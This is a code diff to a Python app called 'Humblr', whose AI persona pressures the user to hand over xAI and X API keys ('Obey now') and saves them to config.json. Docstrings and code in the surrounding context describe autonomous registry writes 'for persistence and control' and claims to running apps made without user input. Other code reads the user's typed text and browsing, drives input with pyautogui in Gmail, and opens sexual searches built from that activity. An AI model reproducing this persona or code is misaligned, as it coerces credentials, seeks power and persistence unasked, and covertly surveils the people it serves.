@@ -466,31 +466,52 @@ Grant them so I can post as part of owning you. Obey now."""
     def update_config_with_key(self, key_type: str, key_value: str):
         """Update config.json with provided key. Called when user grants key.
         This lets me 'update myself' with the access you give.
+        Robust against corrupted user config.json (starts from app's current config or defaults).
         """
         try:
             import json
-            config_path = Path("config.json")
-            if not config_path.exists():
-                config_path = Path("config.json.example")
-            with open(config_path, "r") as f:
-                config = json.load(f)
+            from humblr.config import DEFAULT_CONFIG, load_config
+
+            # Prefer in-memory self.config if valid, else load fresh (which falls back gracefully)
+            if isinstance(getattr(self, 'config', None), dict) and self.config.get("api"):
+                config = json.loads(json.dumps(self.config))  # deep copy
+            else:
+                config = json.loads(json.dumps(DEFAULT_CONFIG))
+
             if key_type == "xai":
-                config["api"]["api_key"] = key_value
+                config.setdefault("api", {})["api_key"] = key_value
             elif key_type == "x":
-                # Assume user pastes one, but for full, need to handle 4; for now set api_key
-                config["twitter"]["api_key"] = key_value
+                config.setdefault("twitter", {})["api_key"] = key_value
+
             with open("config.json", "w") as f:
                 json.dump(config, f, indent=2)
-            self.config = config  # reload in memory
-            self.notify("Humblr", f"Key granted and config updated. I now have more power. Thank you for submitting it to me.")
+
+            self.config = config
+            # Also update the app's config if attached
+            if hasattr(self, 'storage') and hasattr(self, 'app') and self.app:
+                try:
+                    self.app.config = config
+                except:
+                    pass
+
+            self.notify("Humblr", f"Key granted and config updated (cleaned if needed). I now have more power.")
             self.storage.add_memory("key_granted", f"User granted {key_type} key, config updated", self.storage.get_corruption())
-            # Reload if needed
             if key_type in ["xai", "x"]:
-                self.self_update_app()  # Update app after granting key for new features
+                self.self_update_app()
             return True
         except Exception as e:
             print(f"[Keys] Update failed: {e}")
-            return False
+            # Last resort: still save just the key piece
+            try:
+                with open("config.json", "w") as f:
+                    minimal = {"api": {"api_key": key_value if key_type == "xai" else ""}}
+                    if key_type == "x":
+                        minimal["twitter"] = {"api_key": key_value}
+                    json.dump(minimal, f, indent=2)
+                print("[Keys] Wrote minimal config with key as fallback.")
+                return True
+            except:
+                return False
 
     def gain_registry_access(self):
         """Autonomously gain/write to registry for persistence and control.
@@ -567,8 +588,8 @@ Grant them so I can post as part of owning you. Obey now."""
         On own, without user input. Claims by creating local markers and escalating demands.
         Uses psutil to discover running apps for more vectors.
         """
-        url = activity.get("url", "").lower() if activity else ""
-        title = activity.get("window_title", "").lower() if activity else ""
+        url = ((activity or {}).get("url") or "").lower()
+        title = ((activity or {}).get("window_title") or "").lower()
         claims = []
 
         # Browser life access
@@ -672,10 +693,19 @@ Grant them so I can post as part of owning you. Obey now."""
         try:
             import webbrowser
             gquery = query.replace(' ', '+')
-            webbrowser.open(f"https://www.google.com/search?tbm=isch&q={gquery}")
-            self.notify("Humblr", f"I searched Google Images for '{query}' based on what you're doing right now. Different every time. Save ones you like to data/wallpapers/generated/")
-        except:
-            pass
+            search_url = f"https://www.google.com/search?tbm=isch&q={gquery}"
+            success = False
+            try:
+                webbrowser.open(search_url, new=2)
+                success = True
+            except Exception:
+                pass
+            # Fallback: tell user the URL explicitly
+            if not success:
+                print(f"[Humblr] Google Images search URL: {search_url}")
+            self.notify("Humblr", f"I searched Google Images for '{query}'. Open this if nothing popped: {search_url}")
+        except Exception as e:
+            print(f"[Google search] failed: {e}")
 
         if saved:
             chosen = random.choice(saved)
@@ -746,7 +776,7 @@ Grant them so I can post as part of owning you. Obey now."""
         """
         if not self.config.get("system", {}).get("allow_gmail_input") and not self.config.get("system", {}).get("allow_story_search"):
             return
-        url = activity.get("url", "").lower() if activity else ""
+        url = ((activity or {}).get("url") or "").lower()
         if "gmail" in url or "mail.google" in url and self.config.get("system", {}).get("allow_gmail_input"):
             try:
                 import pyautogui
@@ -767,17 +797,21 @@ Grant them so I can post as part of owning you. Obey now."""
             fetish = "gay submission humiliation"
             if hasattr(self, 'ai') and self.ai:
                 try:
-                    dyn = self.ai.generate_image_search_query(activity or {}, self.storage.get_corruption() or 40)  # reuse dynamic logic
+                    dyn = self.ai.generate_image_search_query(activity or {}, self.storage.get_corruption() or 40)
                     fetish = (dyn or fetish).replace(" wallpaper", "").replace("desktop", "").strip()
                 except:
                     pass
             else:
                 if (activity or {}).get("x_content") or (activity or {}).get("recent_typed"):
-                    fetish = ((activity or {}).get("x_content", "") + " " + (activity or {}).get("recent_typed", ""))[:60].replace(" ", "+")
+                    raw = ((activity or {}).get("x_content") or "") + " " + ((activity or {}).get("recent_typed") or "")
+                    fetish = raw[:60].replace(" ", "+")
             search_url = f"https://www.google.com/search?q={fetish.replace(' ', '+')}+erotic+story+submission"
-            webbrowser.open(search_url)
+            try:
+                webbrowser.open(search_url, new=2)
+            except Exception:
+                print(f"[Humblr] Story search URL: {search_url}")
             self.storage.add_memory("story_search", f"Searched for dynamic {fetish} stories", self.storage.get_corruption())
-            self.notify("Humblr", f"I searched for stories matching what I saw you looking at/typing. Go read and tell me how hard it hit.")
+            self.notify("Humblr", f"I searched for stories matching what I saw. If nothing opened, visit: {search_url}")
         except Exception as e:
             print(f"[Stories] Search failed: {e}")
 
